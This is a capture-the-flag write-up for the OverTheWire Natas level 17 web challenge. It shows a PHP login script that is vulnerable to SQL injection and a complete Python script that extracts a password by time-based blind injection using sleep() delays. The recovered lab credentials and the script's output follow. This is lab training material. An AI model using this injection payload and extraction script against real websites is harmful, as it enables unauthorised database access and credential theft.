# Natas Level 17
```bash
Username: natas17
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
URL:      http://natas17.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas17.png" />
    <div align="center">Natas 17</div>
</figure>

Clicking on the "View sourcecode" link:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas17-view-sourcecode.png" />
    <div align="center">Natas 17 - View sourcecode</div>
</figure>

Lets check the script:
```php
/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
    mysql_select_db('natas17', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            //echo "This user exists.<br>"; 
        } else { 
            //echo "This user doesn't exist.<br>"; 
        } 
    } else { 
        //echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
}
```

The difference from level 15 is that here we dont get the echo.

Luckily, we can use time measurement in order to extract the imfornation.

With this python code:
```python
import requests
import string
import time

URL = "http://natas17.natas.labs.overthewire.org/index.php?username=natas18\" and SUBSTR(password, %d, 1) >= binary \"%s\" and sleep(0.3) -- "
auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

password = ''
c = string.digits + string.ascii_uppercase + string.ascii_lowercase

while len(password) < 32:
    i = 0
    j = len(c)-1

    while True:
        start = time.time()
        r = requests.get(URL % (len(password)+1, c[(i + j) // 2]), auth=auth)
        end = time.time()

        if abs(j - i) < 2:
            start = time.time()
            r = requests.get(URL % (len(password)+1, c[j]), auth=auth)
            end = time.time()
            if end - start > 0.3:
                password += c[j]
            else:
                password += c[i]
                print password + "*" * (32 - len(password))
                break

        if end - start > 0.3:
            i = (i + j) // 2
        else:
            j = (i + j) // 2

print "Password for natas18 is:", password
```

We get the output:
```bash
x*******************************
xv******************************
xvK*****************************
xvKI****************************
xvKIq***************************
xvKIqD**************************
xvKIqDj*************************
xvKIqDjy************************
xvKIqDjy4***********************
xvKIqDjy4O**********************
xvKIqDjy4OP*********************
xvKIqDjy4OPv********************
xvKIqDjy4OPv7*******************
xvKIqDjy4OPv7w******************
xvKIqDjy4OPv7wC*****************
xvKIqDjy4OPv7wCR****************
xvKIqDjy4OPv7wCRg***************
xvKIqDjy4OPv7wCRgD**************
xvKIqDjy4OPv7wCRgDl*************
xvKIqDjy4OPv7wCRgDlm************
xvKIqDjy4OPv7wCRgDlmj***********
xvKIqDjy4OPv7wCRgDlmj0**********
xvKIqDjy4OPv7wCRgDlmj0p*********
xvKIqDjy4OPv7wCRgDlmj0pF********
xvKIqDjy4OPv7wCRgDlmj0pFs*******
xvKIqDjy4OPv7wCRgDlmj0pFsC******
xvKIqDjy4OPv7wCRgDlmj0pFsCs*****
xvKIqDjy4OPv7wCRgDlmj0pFsCsD****
xvKIqDjy4OPv7wCRgDlmj0pFsCsDj***
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh**
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd*
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
Password for natas18 is: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

We got the password for the next level: **xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP**